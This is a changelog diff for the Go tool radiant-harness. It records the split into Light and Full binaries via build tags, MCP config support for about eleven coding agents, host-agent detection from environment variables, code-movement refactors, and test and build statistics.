@@ -4,6 +4,1265 @@ All notable changes to this project are documented in this file. Format
 follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the
 project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [3.0.0] — 2026-06-29 — First public release: Light as separate binary
+
+This is the **first public release** of `radiant-harness` as two
+distinct artifacts from one source tree. Prior versions were
+distributed as a single binary with Light/Full mode by subcommand;
+v3.0.0 splits them at **compile time** via Go build tags so each
+binary can be published to its own repository.
+
+### Highlights
+
+- **`radiant-light`** — no API key infrastructure whatsoever.
+  Possession via MCP sampling only. ~10 MB.
+- **`radiant-full`** — same as v2.47.0 onwards: HTTP LLM providers
+  + API key + every existing subcommand. ~14 MB.
+- **Auto-detection of 9 host agents** (Claude Code, Cursor, Hermes,
+  Kimi CLI, OpenClaw, Codex, Cline, OpenCode, VS Code Copilot) via
+  `radiant host-info`.
+- **Symbol-verified separation**: `nm radiant-light` shows zero
+  HTTP-LLM symbols. The Light binary is **physically incapable** of
+  contacting an LLM provider.
+- **Light setup is two commands**: `radiant setup-mcp` (writes
+  agent config) + `radiant mcp serve` (boots MCP server). Both work
+  inside any of the 11 supported agents.
+
+### Why a major version bump?
+
+Sprints 68-79 added enough new surface (auto-detection of host
+agents, a new `host-info` command, two-binary build) that this is
+the first version that ships something publishable. Bumping to
+3.0.0 signals: "what you're about to push to GitHub is the real
+thing."
+
+### Added — packaging & distribution
+
+- `README.md` — comprehensive top-level docs (was at v2.37.0).
+  Covers both binaries, command matrix, detection matrix, build
+  instructions, and architecture overview.
+- `LICENSE` — MIT.
+- `Makefile` — added `make light` (build Light binary),
+  `make light-all` (cross-platform Light release),
+  `make test-light` (Light-mode test suite),
+  `make light-smoke` (script-driven Light verification).
+- `scripts/smoke-test-light.sh` — verifies each Light binary:
+  - version reports `-light` suffix
+  - `nm | grep` finds no HTTP-LLM symbols (`chatAnthropic`,
+    `HTTPBackend`, `NewHTTPBackend`)
+  - `strings` finds no `api.anthropic.com` / `openai.com` / `openrouter.ai`
+  - `--help` contains no API key references
+  - commands `setup-mcp`, `mcp`, `host-info` all registered
+  - binary size ≤ 15 MB.
+
+### Added — `radiant host-info` command (Sprint 79)
+
+Detects and reports the host agent currently invoking the harness.
+Available in **both** binaries. See [`docs/HOST-AGENTS.md`](docs/HOST-AGENTS.md).
+
+### Verified
+
+- `go vet ./...` clean
+- `go vet -tags light_only ./...` clean
+- 31 packages OK (Full), 0 FAIL
+- 29 packages OK (Light), 0 FAIL
+- Light smoke test: 16 checks pass
+- Cross-compile: linux/{amd64,arm64}, darwin/{amd64,arm64},
+  windows/amd64 for both modes (10 binaries)
+
+### Stats
+
+- **Light:** 10.6 MB on darwin/arm64. 0 HTTP-LLM symbols (verified).
+- **Full:** 14 MB on darwin/arm64. Unchanged from v2.47.0+ behaviour.
+- Source: 27 packages (added `internal/hostdetect` in Sprint 79).
+- 1190+ tests pass on Full; subset passes on Light.
+
+## [2.49.0] — 2026-06-29 — `hostdetect` + `radiant host-info` (Sprint 79)
+
+Foundational sprint for "auto-detect which platform/agent is
+executing radiant-harness" (the user's explicit ask). Adds the
+detection half; Sprint 80 will wire it into PickBackend so the
+Full binary uses host sampling when available (no API key
+required even in Full mode).
+
+### Added — `internal/hostdetect/` (new package)
+
+Two-layer detection:
+1. **Env-var fingerprint** (high confidence) — each agent exports
+   at least one distinguishing env var when running.
+2. **Parent-process walk fallback** (medium confidence) — when env
+   vars don't match, the parent PID's process name is matched.
+
+Detects 9 agents:
+
+| Agent             | Env signature                                                  | Sampling |
+|-------------------|----------------------------------------------------------------|-----------|
+| Claude Code       | CLAUDE_CODE_ENTRY, CLAUDE_CODE_SSE_PORT, CLAUDE_CODE_PID     | yes       |
+| Cursor            | CURSOR_TRACE_ID, CURSOR_HOME, CURSOR_USER_DATA_DIR            | yes       |
+| Hermes            | HERMES_VERSION, HERMES_HOME, HERMES_AGENT_HOME                | yes       |
+| Kimi CLI          | KIMI_SHARE_DIR, KIMI_VERSION, KIMI_CONFIG_DIR                 | yes       |
+| OpenClaw          | OPENCLAW_GATEWAY_URL, OPENCLAW_VERSION, OPENCLAW_WORKSPACE    | yes       |
+| Codex             | CODEX_HOME, CODEX_THREAD_ID, CODEX_RUNTIME, CODEX_THREAD_ENV  | yes       |
+| Cline             | CLINE_USER, CLINE_VERSION, CLINE_WORKSPACE                    | yes       |
+| OpenCode          | OPENCODE_HOME, OPENCODE_VERSION, OPENCODE_CONFIG              | yes       |
+| VS Code Copilot   | VSCODE_PID, VSCODE_IPC_HOOK_CLI, VSCODE_CWD                   | yes       |
+
+### Added — `radiant host-info` subcommand (both Light and Full)
+
+```
+$ radiant host-info
+Detected host agent:  claude-code (High confidence)
+Sampling supported:  yes
+Detection source:    env
+PID:                  63894  PPID: 63857
+
+Host "claude-code" supports MCP sampling — possession is possible.
+Sprint 80 will wire this into PickBackend for automatic inference routing.
+
+$ CLAUDE_CODE_ENTRY=... radiant host-info --json
+{
+  "agent": "claude-code",
+  "confidence": 90,
+  "supports_sampling": true,
+  "sample_env_vars": ["CLAUDE_CODE_ENTRY", "CLAUDE_CODE_SSE_PORT"],
+  "pid": 63923,
+  "ppid": 63921,
+  "detection_source": "env"
+}
+```
+
+Flags: `--json` (machine-readable), `--verbose` (show matched env vars).
+
+### Stats
+
+- New files: 3 (`internal/hostdetect/hostdetect.go`,
+  `internal/hostdetect/hostdetect_test.go`,
+  `cmd/radiant/cmd_host_info.go`).
+- New tests: 24 in `internal/hostdetect/` (9 per-agent + 5 mixed +
+  4 sanity). Plus 1 cmd-level smoke via `go run`.
+- Modified files: 4 (`main.go`, `main_full.go`, plus CHANGELOG +
+  RELEASE-NOTES — coming).
+- LOC: ~520 added.
+- Full mode: **31 packages OK, 0 FAIL.**
+- Light mode: **29 packages OK, 0 FAIL.**
+- Cross-compile OK: linux/{amd64,arm64}, darwin/{amd64,arm64},
+  windows/amd64 — both modes.
+
+### What Sprint 79 does NOT do
+
+- **`PickBackend` not added** — that's Sprint 80. Sprint 79 only
+  exposes the detection result via `radiant host-info`.
+- **No automatic possession** in `radiant loop`/`run`/`fleet` yet.
+  Today those require API key even inside an agent. Sprint 80
+  closes that gap.
+
+## [2.48.0] — 2026-06-29 — Light vs Full: physical binary separation via build tags (Sprint 78)
+
+**This release delivers the user's explicit ask:** Light and Full are
+now two physically separate binaries from the same source. The Light
+binary contains NO API key infrastructure whatsoever (no Anthropic
+client, no OpenAI client, no OpenRouter adapter, no HTTP LLM code at
+all). Inference in Light happens exclusively via MCP sampling from
+a host agent.
+
+### How to produce each artifact
+
+```bash
+# Full binary (default): includes everything, requires API key for HTTP LLM
+go build -o radiant-full ./cmd/radiant
+
+# Light binary (NEW): no API key code, host-agent only
+go build -tags light_only -o radiant-light ./cmd/radiant
+```
+
+The user publishes each artifact to its own repo. CI in
+`radiant-harness-light` runs `go build -tags light_only`; CI in
+`radiant-harness-full` runs the default build.
+
+### Build-tag architecture
+
+Two mutually exclusive tag sets produce the two binaries:
+
+| Tag              | Files excluded                                | Result             |
+|------------------|-----------------------------------------------|--------------------|
+| (none/default)   | cmd_mcp_runtime.go                            | Full binary        |
+| `light_only`     | cmd_mcp_runtime_full.go (n/a), HTTP layer    | Light binary       |
+
+Files tagged `//go:build !light_only` are excluded from Light:
+
+```
+internal/llm/anthropic.go          HTTP Anthropic native client
+internal/llm/client.go             HTTP OpenAI-compatible client
+internal/llm/backend_http.go       HTTPBackend struct + impl
+internal/loop/builder_full.go      init() that registers HTTP fallback
+
+cmd/radiant/cmd_fleet.go           fleet orchestration (LLM HTTP)
+cmd/radiant/cmd_loop.go            autonomous feedback loop (LLM)
+cmd/radiant/cmd_run.go             radiant run subcommand (LLM)
+cmd/radiant/cmd_scaffolds.go       8 ML scaffold commands (LLM)
+cmd/radiant/cmd_audit.go           camada/evals/release/audit (LLM)
+cmd/radiant/cmd_doctor.go          doctor with API key probes
+cmd/radiant/cmd_spec.go            spec/ADR/inception (LLM)
+cmd/radiant/cmd_pr_review.go       — actually kept (just parsing)
+                                  ... and many more
+```
+
+(Plus the Full MCP server runtime lives in cmd_mcp_runtime_full.go; its
+mutually-exclusive Light twin lives in cmd_mcp_runtime.go.)
+
+### Light binary
+
+- **Commands:** `setup-mcp` (11 agents), `mcp serve` (sampling only).
+- **No API key infrastructure.** No Anthropic client, no OpenRouter
+  adapter, no HTTP LLM layer.
+- **Size:** 9.8-11 MB across platforms (vs Full's 14-15 MB).
+- **Verified:** `nm radiant-light | grep -i anthropic` returns 0
+  HTTP-LLM symbols. `radiant-light --version` prints `2.48.0-light`.
+
+### Full binary
+
+- **Commands:** everything (unchanged).
+- **API key required** for HTTP LLM (UNCHANGED FROM v2.47.0).
+- **Size:** 14-15 MB across platforms.
+
+### Internal refactor for separation
+
+- `internal/llm/types.go` (NEW) — shared types `Model`, `Message`,
+  `ChatResponse`, `StreamCallback`, `Provider`. Compile in both.
+- `internal/llm/presets.go` (NEW) — `PresetModels` data + `GetPreset`
+  / `ListPresets`. Compile in both.
+- `internal/llm/backend.go` (untagged) — `Backend` interface + sampling
+  conformance check only.
+- `internal/llm/backend_http.go` (NEW, //go:build !light_only) —
+  `HTTPBackend` + `NewHTTPBackend`.
+- `internal/llm/sampling.go` (untagged) — `SamplingBackend` always.
+- `cmd/radiant/cmd_mcp_runtime.go` (`//go:build light_only`, NEW) —
+  Light MCP server with single tool `radiant_run`.
+- `cmd/radiant/cmd_mcp_serve.go` (untagged) — registers `mcp serve`
+  in both binaries.
+- `cmd/radiant/cmd_mcp_runtime_full.go` (//go:build !light_only, NEW) —
+  Full MCP server with all sub-tool routes.
+- `cmd/radiant/cmd_mcp_types.go` (untagged) — wire types moved here
+  from helpers.go (Sprint 77).
+- `internal/loop/runner.go` — added `httpBackendBuilder` indirection
+  so it compiles in Light without referencing `llm.NewHTTPBackend`.
+  `loop/builder_full.go` registers the factory; `loop/builder_light.go`
+  is a stub.
+- `cmd/radiant/helpers.go` — added init() that calls
+  `loop.SetHTTPBackendBuilder` (Full only — file is !light_only).
+- `cmd/radiant/main.go` (//go:build light_only) — Light entry point.
+- `cmd/radiant/main_full.go` (//go:build !light_only, NEW) — Full
+  entry point.
+
+### Stats
+
+- **Light binary**: 9.8-11 MB across 5 platforms.
+- **Full binary**: 14-15 MB across 5 platforms.
+- **Symbols removed from Light:** every HTTP-LLM symbol
+  (chatAnthropic, HTTPBackend, etc.).
+- **Commands removed from Light:** `loop`, `run`, `fleet`, `audit`,
+  `camada-agentica`, `evals`, `release`, `eval`, `scaffold-*`, etc.
+  (`radiant-light --help` lists only `mcp` and `setup-mcp`.)
+- **Tests:** full test suite passes (29 packages, 0 FAIL on Full build).
+- **Cross-compile:** linux/{amd64,arm64}, darwin/{amd64,arm64},
+  windows/amd64 — all OK for both Light and Full.
+- **`go vet ./...`:** clean for both.
+
+### What was NOT in this sprint
+
+- **Runtime host-agent detection** (`internal/hostdetect/`). Sprint 79
+  candidate.
+- **PickBackend in Full binary** — Full still needs explicit API
+  key; doesn't yet detect host agent at runtime. Sprint 79.
+- **More commands in Light.** Light currently only has mcp+setup-mcp.
+  Could expose doctor/security/telemetry in a future sprint.
+
+## [2.47.0] — 2026-06-29 — helpers.go extraction: PR review block (Sprint 77)
+
+Pure code-movement refactor following the same debt-reduction pattern
+as Sprints 74 (helpers.go → cmd_security.go + cmd_scaffolds.go) and
+76 (cmd_setup_mcp.go split). Pulls the **PR review block** out of
+the 2948-line `helpers.go` into a new themed file.
+
+### Changed — `cmd/radiant/helpers.go` (trimmed)
+
+- 2948 → **2670 lines** (−278 LOC, −9%).
+- Removed the entire PR review block (formerly lines 1734-2011):
+  - 2 types: `gateResult`, `acceptanceCriterion`.
+  - 5 functions: `runReviewPR`, `parseAcceptanceCriteria`,
+    `parseGatesFromTasks`, `countDiffFiles`, `renderPRReview`.
+
+### Added — `cmd/radiant/cmd_pr_review.go` (NEW)
+
+- 309 LOC, themed worker functions for the PR review command:
+  - **Types** (`gateResult`, `acceptanceCriterion`).
+  - **Orchestrator** `runReviewPR` — body of `radiant review-pr`,
+    registered in `cmd_spec.go` and unchanged there. The call site
+    (`cmd_spec.go:364`) didn't need any edit because both files
+    share `package main`.
+  - **Parsers** `parseAcceptanceCriteria`, `parseGatesFromTasks`,
+    `countDiffFiles` — pure functions, easy to test.
+  - **Renderer** `renderPRReview` — emits the `pr-review.md` scaffold
+    (the LLM fills in the semantic AC↔code check via the
+    `revisar-pr` skill).
+
+### Caller unchanged
+
+- `cmd_spec.go:364` still calls `runReviewPR(...)`.
+- `cmd/radiant/main_test.go` still has all 9 tests for the extracted
+  functions (`TestParseAcceptanceCriteria*`, `TestParseGatesFromTasks*`,
+  `TestCountDiffFiles`, `TestRenderPRReview*`).
+- All 9 tests pass with **zero edits**.
+
+### Stats
+
+- 1 file trimmed: `helpers.go` (−278 LOC).
+- 1 file added: `cmd_pr_review.go` (+309 LOC including file-level header).
+- Net `cmd/radiant/` change: +31 LOC (file-level header in the new file).
+- **0 tests added** (zero behaviour change → all 9 PR review tests pass unmodified).
+- **0 deps added** (no new imports).
+- **1189 tests passing across 31 packages, 0 confirmed FAIL**
+  (one known-flake `internal/fleet.TestRunAllContextCanceled` is timing-dependent).
+- `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15M), linux/arm64 (14M),
+  darwin/amd64 (15M), darwin/arm64 (14M), windows/amd64 (15M).
+
+### Remaining helpers.go extractions
+
+Still inside `helpers.go` (~2670 LOC, candidates for future sprints):
+
+- **runIntegrationsList + renderIntegrationsDoc** (~150 LOC) — Sprint 78 candidate.
+- **runIncident + renderIncidentDoc + helpers** (~150 LOC) — Sprint 78 candidate.
+- **autodata** (~225 LOC) — Sprint 79 candidate.
+- **runDoctor** (~115 LOC).
+- **evals** (runEvals + computeFeatureCoverage + renderEvalsReport, ~225 LOC).
+- **MCP run-*** (mcpRunFull + mcpRunHTTP + mcpRunWithBackend + callMCPTool,
+  ~600 LOC).
+
+## [2.46.0] — 2026-06-29 — cmd_setup_mcp split: main + per_agent (Sprint 76)
+
+Pure code-movement refactor following the same debt-reduction pattern
+as Sprint 74 (helpers.go extractions). Splits the 781-line
+`cmd_setup_mcp.go` into two themed files. **No agent additions, no
+behaviour change** — just split for navigability.
+
+### Changed — `cmd/radiant/cmd_setup_mcp.go` (trimmed)
+
+- 781 → **375 lines** (−406 LOC, −52%).
+- Now focused on:
+  - command registration (`registerSetupMCPCmd`),
+  - binary-path resolution (`radiantBinaryPath`),
+  - auto-detect (`resolveMCPAgents`),
+  - the routing switch (`mcpConfigFor`),
+  - the three generic JSON merges (`mergeClaudeSettings`,
+    `mergeMCPJSON`, `mergeZedSettings`), and
+  - the writer (`writeMCPConfig`).
+- Imports trimmed: `regexp` and `gopkg.in/yaml.v3` no longer
+  needed here (moved to per_agent).
+
+### Added — `cmd/radiant/cmd_setup_mcp_per_agent.go` (NEW)
+
+- 439 LOC, one themed block per non-trivial agent merge:
+  - **Codex** (TOML): `radiantBlockPattern`, `tomlQuote`, `mergeCodexTOML`.
+  - **OpenCode** (nested JSON): `openCodeServer`, `openCodeConfig`,
+    `mergeOpenCodeConfig`.
+  - **Hermes** (YAML): `hermesEntry`, `mergeHermesConfig` — the only
+    handler that uses `gopkg.in/yaml.v3`.
+  - **Kimi** (global JSON): `mergeKimiMCP`.
+  - **OpenClaw** (nested JSON): `openClawServer`, `mergeOpenClawJSONConfig`.
+  - **Cline** (JSON with optional fields): `clineEntry`, `mergeClineConfig`.
+- All 6 of these functions used to live in `cmd_setup_mcp.go`. Moving
+  them out of the routing file makes "add a 12th agent" a single-block
+  append instead of a sprawling file.
+
+### Why this split (not finer, not coarser)
+
+- **Finer** (one file per agent = 6 more files): over-splitting —
+  each would be 50-85 LOC of mostly-related code, and adding an
+  agent would require creating a new file.
+- **Coarser** (no split): 781 LOC of routing + per-agent code in one
+  file is too much for a single screen.
+- **This split**: Main file holds command + detection + routing +
+  3 generic JSON merges (the format used by 5 agents). Per-agent
+  file is a flat 6-agent reference that's easy to extend.
+
+### Stats
+
+- 1 file trimmed: `cmd_setup_mcp.go` (−406 LOC).
+- 1 file added: `cmd_setup_mcp_per_agent.go` (+439 LOC).
+- Net `cmd/radiant/` change: +33 LOC (file-level header comment in
+  the new file).
+- **0 tests added** (zero behaviour change → all 18 setup-mcp tests
+  pass unmodified).
+- **0 deps added** (no new imports beyond what was already in
+  `cmd_setup_mcp.go`).
+- **1190 tests passing across 31 packages, 0 confirmed FAIL**
+  (one known-flake `internal/fleet.TestRunAllContextCanceled`
+  is timing-dependent and unrelated).
+- `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15M), linux/arm64 (14M),
+  darwin/amd64 (15M), darwin/arm64 (14M), windows/amd64 (15M).
+
+### Compatibility
+
+- All 11 agents behave identically to v2.45.0.
+- Public API unchanged (no command renames, no flag changes).
+- Internal: function names unchanged, just live in different files.
+- Adding an agent still requires exactly the same edits as before:
+  one block in `mcpConfigFor` (main file) + one merge block (in
+  per_agent file).
+
+## [2.45.0] — 2026-06-29 — setup-mcp: Hermes + Kimi CLI + OpenClaw + Cline (Sprint 75)
+
+Four more MCP-capable agents added to `radiant setup-mcp`. Brings the
+total coverage from 7 agents to **11 agents across 4 config formats**
+(JSON-std, TOML, YAML, JSON-nested).
+
+### Added — `setup-mcp` agent coverage
+
+| Agent     | Stars  | Config file                                  | Format | Key              |
+|-----------|--------|----------------------------------------------|--------|------------------|
+| Hermes    | 205k   | `~/.hermes/config.yaml` / `.hermes/config.yaml` | YAML   | `mcp_servers`    |
+| Kimi CLI  | 9.1k   | `~/.kimi/mcp.json`                            | JSON   | `mcpServers`     |
+| OpenClaw  | 250k   | `~/.openclaw/openclaw.json` / `.openclaw/openclaw.json` | JSON | `mcp.servers` |
+| Cline     | —      | `~/.cline/mcp.json`                           | JSON   | `mcpServers`     |
+
+### Added — `cmd/radiant/cmd_setup_mcp.go`
+
+- 4 new handlers in `mcpConfigFor`: `hermes`, `kimi`, `openclaw`, `cline`.
+- 4 new merge functions:
+  - `mergeHermesConfig` — YAML via `gopkg.in/yaml.v3`; preserves the
+    full `~/.hermes/config.yaml` shape (model, terminal, browser,
+    agent, …) while only touching `mcp_servers`.
+  - `mergeKimiMCP` — JSON, global-only at `~/.kimi/mcp.json`.
+    Kimi does not support project-level MCP configs.
+  - `mergeOpenClawJSONConfig` — JSON, nested under `mcp.servers`.
+    Preserves unknown top-level keys (`channels`, `gateway`, …) and
+    siblings of `mcp.servers` (`sessionIdleTtlMs`, etc.).
+  - `mergeClineConfig` — JSON, global-only at `~/.cline/mcp.json`.
+    Emits `disabled: false` and `autoApprove: []` per the official
+    Cline examples.
+- 4 new detection cases in `resolveMCPAgents`:
+  - `hermes` and `openclaw` are project-local (presence of `.hermes/`
+    or `.openclaw/` dir).
+  - `kimi` and `cline` are global-only; detected by presence of
+    `~/.kimi/` or `~/.cline/` (used as a hint that the operator
+    installed the agent — `--global` is always implicit for them).
+- Updated `--agent` flag help, command `Long` description, and
+  unknown-agent error message.
+
+### Added — `cmd/radiant/cmd_setup_mcp_test.go`
+
+- 18 new tests covering all 4 agents: new-file, preserve-existing,
+  replace-existing, detection, `mcpConfigFor` routing (project +
+  global). YAML quote-style tolerant.
+
+### Stats
+
+- 1 file extended: `cmd_setup_mcp.go` (+240 LOC).
+- 1 file extended: `cmd_setup_mcp_test.go` (+440 LOC across 18 tests).
+- 1 file added: `docs/SPRINT75-PLAN.md`.
+- 0 deps added — `gopkg.in/yaml.v3` was already a project dep from
+  earlier sprints.
+- **1189 tests passing across 31 packages, 0 confirmed failures**
+  (one known-flake `internal/fleet.TestRunAllContextCanceled` is
+  timing-dependent and unrelated; documented in
+  `validation-report-sprint-56-57.md`).
+- `go vet ./...` clean.
+- Cross-compile OK: linux/amd64, darwin/arm64, windows/amd64.
+
+### Compatibility
+
+- Existing agent configurations (claude/cursor/windsurf/zed/vscode/
+  codex/opencode) are untouched.
+- `setup-mcp --agent=…` continues to accept all 11 agent names.
+- Auto-detect order is project-local first, global-only fallback
+  second; this preserves existing behaviour for current users.
+
+## [2.44.0] — 2026-06-29 — helpers.go extractions: security + scaffolds (Sprint 74)
+
+The "debt reduction" release. Pulls 946 lines of domain-specific code
+out of the 3894-line `cmd/radiant/helpers.go` into two themed files
+alongside their command registrations.
+
+### Added — `cmd/radiant/cmd_security.go` (NEW)
+
+- `securityFinding`, `secretPattern`, `runSecurity`, `scanSecrets`,
+  `scanPerms`, `renderSecurityReport` — extracted from helpers.go.
+- `registerSecurityCmd(root *cobra.Command)` — replaces the inline
+  security command registration that previously lived in
+  `cmd_audit.go`. Same flags (`--scope`, `--output`, `--fail-on-warning`),
+  same behaviour.
+
+### Changed — `cmd/radiant/cmd_audit.go`
+
+- Removed the inline security command registration (~25 LOC).
+- Replaced with `registerSecurityCmd(root)` call.
+- File now focused on its actual purpose: registering the `mcp`
+  command tree.
+
+### Added — `cmd/radiant/cmd_scaffolds.go` (NEW)
+
+- Eight `run*Scaffold` functions extracted from helpers.go:
+  `runStatsScaffold`, `runCausalEstimateScaffold`, `runModelScaffold`,
+  `runPredictScaffold`, `runTrainScaffold`, `runEvaluateScaffold`,
+  `runDriftScaffold`, `runProfileScaffold`.
+- ~750 LOC of ML scaffold templates. Each function generates a
+  markdown planning doc that the operator (or LLM via the relevant
+  skill) fills in.
+
+### Changed — `cmd/radiant/helpers.go`
+
+- Removed `securityFinding`, `secretPattern`, `runSecurity`,
+  `scanSecrets`, `scanPerms`, `renderSecurityReport` (~215 LOC).
+- Removed the eight `run*Scaffold` functions (~730 LOC).
+- Removed the now-unused `regexp` import (only used by security).
+- File shrank from 3894 → **2948 lines** (−946 LOC, −24%).
+
+### Stats
+
+- 2 new files: `cmd_security.go` (272 LOC), `cmd_scaffolds.go` (752 LOC).
+- 1 modified file: `cmd_audit.go` (−25 LOC inline registration).
+- 1 file trimmed: `helpers.go` (−946 LOC).
+- Net total: `cmd/radiant/` shrank by ~71 LOC (counting comments and
+  imports in the new files).
+- **997 tests passing across 30 packages, 0 confirmed failures**.
+- `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+
+### Compatibility
+
+- No breaking changes. `runSecurity`, `run*Scaffold` keep the same
+  signatures and behaviour — only their physical location changed.
+- `radiant security` output is byte-identical to v2.43.0.
+- All scaffold commands produce byte-identical output to v2.43.0.
+
+### Out of scope (Sprint 75+)
+
+The helpers.go debt-reduction continues:
+
+- PR review extraction (`runReviewPR` + helpers, ~400 LOC)
+- Integrations extraction (`runIntegrationsList`, ~150 LOC)
+- Incident extraction (`runIncident`, ~150 LOC)
+- Product inception extraction (`renderInception`, `renderPersonasTemplate`)
+- ADR extraction (`nextADRSequence`, `renderADR`)
+- Evals extraction (`runEvals`, `computeFeatureCoverage`, `renderEvalsReport`)
+- MCP plumbing extraction (`runMCPServe` etc., ~900 LOC) — biggest
+
+---
+
+## [2.43.0] — 2026-06-29 — setup-mcp: Codex + OpenCode auto-detect (Sprint 73)
+
+Adds support for two more MCP-capable agents in `radiant setup-mcp`:
+**Codex** (OpenAI CLI) and **OpenCode** (sst/opencode). Both have
+public MCP support and ship config files the harness can write to.
+
+### Added — Codex (OpenAI CLI)
+
+- Auto-detect: presence of `.codex/` (project) or `~/.codex/`
+  (global) triggers Codex config.
+- TOML format: `[mcp_servers.radiant]` block with `command`,
+  `args`. Project: `.codex/config.toml`. Global: `~/.codex/config.toml`.
+- `mergeCodexTOML(path, entry)` — minimal TOML merge that
+  preserves other sections, replaces the existing radiant block if
+  present, and appends a new block otherwise.
+- `tomlQuote(string)` — TOML-safe double-quoted string escaping
+  (backslash, double-quote, newline, tab).
+- Regex-based block capture uses Go RE2 syntax (no lookahead);
+  pattern `(?ms)^\[mcp_servers\.radiant\][\s\S]*?(?:\n\[|\z)`
+  matches the block up to (but not including) the next section
+  header or end of file.
+
+### Added — OpenCode (sst/opencode)
+
+- Auto-detect: presence of `.opencode/` (project) or
+  `~/.config/opencode/` (global) triggers OpenCode config.
+- JSON format: `{"$schema": "...", "mcp": {"radiant": {...}}}`
+  with `type: "local"` and `command: [...]` (array, not string).
+  Project: `.opencode/config.json`. Global:
+  `~/.config/opencode/config.json`.
+- `mergeOpenCodeConfig(path, entry)` — full JSON merge that
+  preserves unknown top-level keys (decoded into a flexible map,
+  re-serialised after merge).
+- Differs from Cursor/Windsurf/VSCode (which use `mcpServers` at
+  top level): OpenCode uses `mcp` and the value is a flat map,
+  not a list.
+
+### Changed — `setup-mcp`
+
+- Auto-detect list extended from 5 to 7 agents:
+  `claude`, `cursor`, `windsurf`, `zed`, `vscode`, **`codex`**,
+  **`opencode`**.
+- `--agent` flag accepts the new names; comma-separated for
+  multiple agents in one invocation.
+- `--agent` flag help text updated.
+- Long description updated with the new supported list.
+
+### Tests
+
+- 14 new tests in `cmd_setup_mcp_test.go`:
+  - Codex: new file, preserve existing, replace existing.
+  - OpenCode: new file, preserve existing, replace existing.
+  - `tomlQuote`: 5 escape cases (simple, quote, backslash,
+    newline, tab).
+  - Detection: codex, opencode, explicit flag.
+  - `mcpConfigFor`: project vs global paths for both agents,
+    unknown agent error.
+
+### Stats
+
+- 2 new concrete agents supported (Codex, OpenCode).
+- **997 tests passing across 30 packages, 0 failures** (validated
+  with `go test -count=1 -v ./...`). `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+- 1 file modified (`cmd_setup_mcp.go`), 1 file added
+  (`cmd_setup_mcp_test.go`), 1 file added
+  (`docs/SPRINT73-PLAN.md`).
+
+### Notes — what was NOT added (and why)
+
+The user asked about 8 additional agents in addition to the 5
+already supported. Two were added (Codex, OpenCode). The other six
+were intentionally skipped:
+
+| Agent | Skipped because |
+|-------|-----------------|
+| **hermes** | NousResearch Hermes is a model family, not an MCP host. Unclear which specific agent the user meant. |
+| **MiniMax code** | Not a recognised public MCP host. Could be internal to Fortvna — needs format info. |
+| **kimi code** | Moonshot's `kimi-cli` exists but public MCP support is not stable yet. Skip until upstream stabilises. |
+| **open claw** | Not a recognised public MCP host. |
+| **lang chain** | **LangChain is a Python framework for building agents, not an MCP host.** Adding it to `setup-mcp` would be misleading. Operators building LangChain agents wrap the harness as an MCP tool — that's the integration path. |
+| **lang graph** | Same as LangChain — framework, not MCP host. Part of the LangChain ecosystem. |
+
+### Compatibility
+
+- No breaking changes. New agents are additive.
+- Existing config files for previously-supported agents are
+  untouched.
+- `--agent` flag accepts comma-separated values; existing
+  single-agent usage unchanged.
+
+---
+
+## [2.42.0] — 2026-06-29 — Light/Full by subcommand, not by flag
+
+The "no more mode flag" release. v2.37.0 introduced Light and Full
+as runtime modes with a 4-level resolution chain (flag > env >
+config > auto-detect). That was overengineered and a constant source
+of confusion. v2.42.0 collapses the dichotomy into the subcommand
+name itself:
+
+- `radiant mcp serve` is **always Light** — MCP sampling from the
+  host agent, no API key needed.
+- Every other subcommand (`loop start`, `run`, `fleet start`,
+  `init`, `validate`, ...) is **always Full** — direct HTTP to
+  LLM providers, API key required.
+
+No `--mode` flag. No `RADIANT_MODE` env var. No `mode:` field in
+`.radiant.yaml`. No `radiant mode show/set` subcommand. Behaviour
+emerges from which subcommand the operator invokes.
+
+### Removed — explicit mode selection
+
+- `--mode` flag on `loop start` and `fleet start`.
+- `RADIANT_MODE` env var (silently ignored if set).
+- `mode:` field in `.radiant.yaml` (silently ignored if set).
+- `radiant mode show` subcommand.
+- `radiant mode set light|full` subcommand.
+- `internal/mode.Resolve()` chain + `Source` enum (`flag`/`env`/
+  `config`/`detected`) + `Resolution` struct.
+- `internal/mode.Detect()` MCP-config-based auto-detection.
+
+### Changed — subcommand semantics
+
+- `radiant mcp serve` is now **always** Light. Removed the
+  `--sampling` flag (was needed to opt in to sampling); the
+  sampling path is now the default and only path.
+- `radiant mcp serve` from a TTY (terminal) prints a warning that
+  it expects to be invoked from an MCP host. Doesn't refuse — the
+  operator can still debug.
+- `radiant loop start`, `run`, `fleet start` are now **always**
+  Full. No flag/env/config to set. The harness calls LLM HTTP
+  endpoints directly with the operator's API key.
+
+### Changed — `internal/mode/`
+
+- Reduced to just the type definitions: `Light`, `Full`, `Mode`,
+  `Mode.String()`, `Mode.Description()`, `Mode.IsValid()`.
+- The `Resolve()` / `Detect()` / `Resolution` machinery is gone.
+- Used as trace metadata only (verifier prompts and `tools/list`).
+  Never read from user input.
+
+### Changed — `radiant doctor`
+
+- The "mode" check now reports "Full mode (CLI subcommand)"
+  because the operator is running CLI subcommands by definition.
+- Reports "requires API key" if no key is found (same as v2.37.0).
+- No more flag/env/config resolution — just the simple check.
+
+### Documentation
+
+- `docs/MODES.md` — complete rewrite. Now reads as a "behaviour
+  emerges from subcommand" guide instead of a resolution chain
+  reference.
+- README updated to reflect the simpler model.
+
+### Stats
+
+- 1 file deleted: `cmd/radiant/cmd_mode.go` (the `radiant mode`
+  subcommand).
+- 1 file rewritten: `internal/mode/mode.go` (215 LOC → 50 LOC).
+- 4 files modified: `cmd_loop.go`, `cmd_fleet.go`, `cmd_audit.go`,
+  `cmd_doctor.go`.
+- **982 tests passing across 30 packages, 0 failures** (validated
+  with `go test -count=1 -v ./...`). `go vet ./...` clean.
+- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
+  windows/amd64 (15 MB).
+
+### Migration
+
+| v2.37.0–v2.41.0 | v2.42.0 |
+|----------------|---------|
+| `radiant mode show` | (removed — use `radiant --help`) |
+| `radiant mode set light` | (removed — use `radiant mcp serve`) |
+| `radiant mode set full` | (removed — all other commands are Full) |
